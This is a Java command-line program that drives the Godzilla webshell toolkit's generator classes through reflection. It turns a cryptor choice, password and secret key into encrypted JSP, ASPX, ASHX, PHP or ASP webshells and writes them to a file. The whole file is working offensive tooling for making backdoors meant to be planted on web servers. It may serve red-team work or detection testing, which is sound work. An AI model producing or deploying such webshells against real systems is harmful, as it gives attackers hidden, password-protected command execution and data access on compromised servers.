import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.security.MessageDigest;
import java.util.Locale;

import core.shellprocessor.StartProcessor;

public final class GodzillaGenerate {
    private GodzillaGenerate() {
    }

    public static void main(String[] args) {
        if (args.length != 5) {
            fail("usage: GodzillaGenerate <cryptor> <container> <password> <secret-key> <output>");
        }
        try {
            StartProcessor.setAutoProcessor("none");
            byte[] generated = generate(args[0], args[1], args[2], args[3]);
            if (generated == null || generated.length == 0) {
                fail("Godzilla generator returned empty content");
            }
            Path output = Path.of(args[4]).toAbsolutePath().normalize();
            Path parent = output.getParent();
            if (parent != null) {
                Files.createDirectories(parent);
            }
            Files.write(
                output,
                generated,
                StandardOpenOption.CREATE,
                StandardOpenOption.TRUNCATE_EXISTING,
                StandardOpenOption.WRITE
            );
        } catch (Throwable error) {
            String detail = error.getMessage();
            fail(error.getClass().getSimpleName() + (detail == null ? "" : ": " + detail));
        }
    }

    private static byte[] generate(
        String rawCryptor,
        String rawContainer,
        String password,
        String secretKey
    ) throws Exception {
        String cryptor = normalize(rawCryptor);
        String container = normalize(rawContainer);
        if (password == null || password.isEmpty()) {
            throw new IllegalArgumentException("password cannot be empty");
        }
        if (secretKey == null || secretKey.isEmpty()) {
            throw new IllegalArgumentException("secret key cannot be empty");
        }
        switch (cryptor) {
            case "javaaesbase64":
                requireContainer(container, "jsp", "jspx");
                return invoke(
                    "shells.cryptions.JavaAes.Generate",
                    new Class<?>[]{String.class, String.class, String.class, String.class},
                    container,
                    password,
                    md5Prefix(secretKey),
                    "base64"
                );
            case "javaaesraw":
                requireContainer(container, "jsp", "jspx");
                return invoke(
                    "shells.cryptions.JavaAes.Generate",
                    new Class<?>[]{String.class, String.class, String.class, String.class},
                    container,
                    password,
                    md5Prefix(secretKey),
                    "raw"
                );
            case "csharpevalaesbase64":
                requireContainer(container, "aspx");
                return invokeInstanceGenerate(
                    "shells.cryptions.csharpAes.CSharpEvalAesBase64",
                    password,
                    secretKey
                );
            case "csharpaesbase64":
                requireContainer(container, "aspx", "ashx");
                return invoke(
                    "shells.cryptions.csharpAes.Generate",
                    new Class<?>[]{String.class, String.class, String.class, String.class},
                    "base64.bin",
                    container,
                    password,
                    secretKey
                );
            case "phpxor":
                requireContainer(container, "php");
                return invokeInstanceGenerate(
                    "shells.cryptions.phpXor.PhpEvalXor",
                    password,
                    secretKey
                );
            case "phpxorraw":
                requireContainer(container, "php");
                return invokeInstanceGenerate(
                    "shells.cryptions.phpXor.PhpXorRaw",
                    password,
                    secretKey
                );
            case "aspxorbase64":
                requireContainer(container, "asp");
                return invokeInstanceGenerate(
                    "shells.cryptions.aspXor.AspXorBae64",
                    password,
                    secretKey
                );
            default:
                throw new IllegalArgumentException("unsupported cryptor: " + rawCryptor);
        }
    }

    private static byte[] invoke(
        String className,
        Class<?>[] parameterTypes,
        Object... arguments
    ) throws Exception {
        Class<?> type = Class.forName(className);
        Method method = type.getMethod("GenerateShellLoder", parameterTypes);
        method.setAccessible(true);
        Object result = method.invoke(null, arguments);
        if (!(result instanceof byte[])) {
            throw new IllegalStateException("generator result is not bytes");
        }
        return (byte[]) result;
    }

    private static byte[] invokeInstanceGenerate(
        String className,
        String password,
        String secretKey
    ) throws Exception {
        Class<?> type = Class.forName(className);
        Object instance = type.getDeclaredConstructor().newInstance();
        Method method = type.getMethod("generate", String.class, String.class);
        method.setAccessible(true);
        Object result = method.invoke(instance, password, secretKey);
        if (!(result instanceof byte[])) {
            throw new IllegalStateException("generator result is not bytes");
        }
        return (byte[]) result;
    }

    private static String md5Prefix(String value) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("MD5");
        byte[] hash = digest.digest(value.getBytes(StandardCharsets.UTF_8));
        StringBuilder builder = new StringBuilder(hash.length * 2);
        for (byte item : hash) {
            builder.append(String.format("%02X", item & 0xff));
        }
        return builder.substring(0, 16);
    }

    private static void requireContainer(String container, String... allowed) {
        for (String item : allowed) {
            if (item.equals(container)) {
                return;
            }
        }
        throw new IllegalArgumentException("unsupported container for cryptor: " + container);
    }

    private static String normalize(String value) {
        return value == null
            ? ""
            : value.replaceAll("[^A-Za-z0-9]", "").toLowerCase(Locale.ROOT);
    }

    private static void fail(String message) {
        System.err.println(message);
        System.exit(2);
    }
}
